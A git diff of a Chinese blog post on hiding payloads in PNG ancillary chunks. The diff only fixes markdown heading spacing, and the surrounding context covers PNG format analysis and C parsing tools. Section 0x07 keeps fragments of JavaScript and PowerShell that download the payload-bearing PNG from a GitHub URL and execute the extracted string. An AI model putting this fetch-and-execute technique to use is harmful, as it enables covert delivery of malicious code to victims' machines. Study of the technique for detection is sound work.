@@ -4,7 +4,7 @@ title: 隐写技巧——利用PNG文件格式隐藏Payload
 ---
 
 
-##0x00 前言
+## 0x00 前言
 ---
 隐写术(Steganography)由来已久，其中有很多好玩儿的细节，所以打算系统的研究一下，这次先从PNG的文件格式开始。
 ![Alt text](
@@ -12,7 +12,7 @@ https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/20
 
 > 图片来自于http://null-byte.wonderhowto.com/how-to/guide-steganography-part-1-hide-secret-messages-images-0130797/
 
-##0x01 简介
+## 0x01 简介
 ---
 
 隐写术可以理解为信息隐藏，在渗透测试中最主要的应用是对Payload的隐藏。本文会对PNG的文件格式进行分析，编写c程序实现自动解析文件格式，并按照其文件格式添加自定义的payload，不仅不会影响图片的正常浏览，同时可将图片上传到网络，使用时将图片下载再以特定格式解密，最终执行payload。
@@ -20,16 +20,16 @@ https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/20
 所有程序源码已上传github，地址为：
 https://github.com/3gstudent/PNG-Steganography
 
-##0x02 PNG文件格式
+## 0x02 PNG文件格式
 ---
  
-###1、PNG文件署名域
+### 1、PNG文件署名域
 前8字节
 固定格式，16进制为：
 `89 50 4e 47 0d 0a 1a 0a `
 
 
-###2、数据块
+### 2、数据块
 | 固定结构  |字节数|说明|
 | ------------- |:-------------:| -----:|
 | Length(长度)| 4字节 | 指定数据块中数据域的长度 |
@@ -75,7 +75,7 @@ https://github.com/3gstudent/PNG-Steganography
 
 
 
-##0x03 实例格式分析
+## 0x03 实例格式分析
 ---
 
 工具：`Hex Editor`
@@ -166,7 +166,7 @@ int main(int argc, char* argv[])
 ![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-3.png)
 
 
-###(3) gAMA
+### (3) gAMA
 
 00000021h: 00 00 00 04 67 41 4D 41 00 00 B1 8F 0B FC 61 05 ; ....gAMA..睆.黙.
 
@@ -176,7 +176,7 @@ Chunk Type Code：	`67 41 4D 41`
 Chunk Data：		`00 00 B1 8F`
 CRC：				`0B FC 61 05`
 
-###(4) cHRM
+### (4) cHRM
 00000031h: 00 00 00 20 63 48 52 4D 00 00 7A 26 00 00 80 84 ; ... cHRM..z&..€?
 00000041h: 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 ; ..?..€?.u0..阘
 00000051h: 00 00 3A 98 00 00 17 70 9C BA 51 3C             ; ..:?..p満Q<
@@ -185,7 +185,7 @@ Length:				`00 00 00 20`
 Chunk Type Code：	`63 48 52 4D`
 Chunk Data：			`00 00 7A 26 00 00 80 84 00 00 FA 00 00 00 80 E8 00 00 75 30 00 00 EA 60 00 00 3A 98 00 00 17 70`
 CRC：				`9C BA 51 3C`
-###(5) IDAT
+### (5) IDAT
 (6-14) tEXt
 (15)IEND
 **数据块结构：**
@@ -200,11 +200,11 @@ CRC：				`AE 42 60 82`
 
 
 
-##0x04 编写程序分析文件格式
+## 0x04 编写程序分析文件格式
 ---
 开发工具：`vc6.0`
 
-###1、读取PNG文件
+### 1、读取PNG文件
 
 保存为example2.cpp，代码如下:
 
@@ -241,7 +241,7 @@ int main(int argc, char* argv[])
 
 
 
-###2、解析数据块结构
+### 2、解析数据块结构
 
 从第8字节开始，读前四字节为ChunkLength
 对应的代码为：
@@ -360,10 +360,10 @@ int main(int argc, char* argv[])
 这个程序可用来对PNG文件进行格式分析，标记PNG文件的数据块名称、偏移地址、数据块长度、比较预期和实际的CRC32校验码，可基于此对批量文件进行分析，查找可疑文件。
 后续会补充python的实现代码
 
-##0x05 去除多余数据
+## 0x05 去除多余数据
 ---
 上面提到，去除辅助数据块的内容对PNG图像的浏览没有影响，下面就尝试去除PNG文件的所有辅助数据块
-###1、工具实现
+### 1、工具实现
 如图，使用`HexEditor Neo`去除辅助数据块gAMA、cHRM和bKGD
 
 ![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-8.PNG)
@@ -373,7 +373,7 @@ int main(int argc, char* argv[])
 ![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-9.png)
 
 
-###2、程序实现
+### 2、程序实现
 去除所有辅助数据块，只提取关键信息。程序先对ChunkName作判断，忽略非关键数据块(Ancillary Chunk)的内容，并保存为new.png
 
 保存为compress.cpp,完整代码为：
@@ -493,7 +493,7 @@ int main(int argc, char* argv[])
 
 
 
-##0x06 写入Payload
+## 0x06 写入Payload
 ---
 **实例：**
 按照辅助数据块的格式写入Payload
@@ -528,14 +528,14 @@ CRC：				fa c4 08 76
 本实例仅作演示，实际使用可换成其他数据块，更加隐蔽
 
 
-###1、工具实现
+### 1、工具实现
 使用HexEditor Neo插入数据，如图
 
 ![Alt text](https://raw.githubusercontent.com/3gstudent/3gstudent.github.io/master/_posts/2016-7-15/2-11.PNG)
 
 保存后，不影响PNG文件浏览
 
-###2、程序实现
+### 2、程序实现
 去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt
 保存为addpayload.cpp,完整代码：
 
@@ -700,11 +700,11 @@ int main(int argc, char* argv[])
 
 
 
-##0x07 读取payload并执行
+## 0x07 读取payload并执行
 ---
 将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：
 
-###1、javascript
+### 1、javascript
 
 ```
 h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
@@ -719,7 +719,7 @@ new ActiveXObject("WScript.Shell").Run(str);
 ```
 
 
-###2、powershell
+### 2、powershell
 
 ```
 $url = 'https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png'
@@ -734,7 +734,7 @@ Start-Process -FilePath $str
 **注:**
 这里给出两种方法，仅作演示
 
-##0x08 小结
+## 0x08 小结
 ---
 本文详细介绍分析了PNG文件的格式，编写程序实现以下功能：
 - 自动解析PNG文件格式，辅助查找其中的隐藏内容
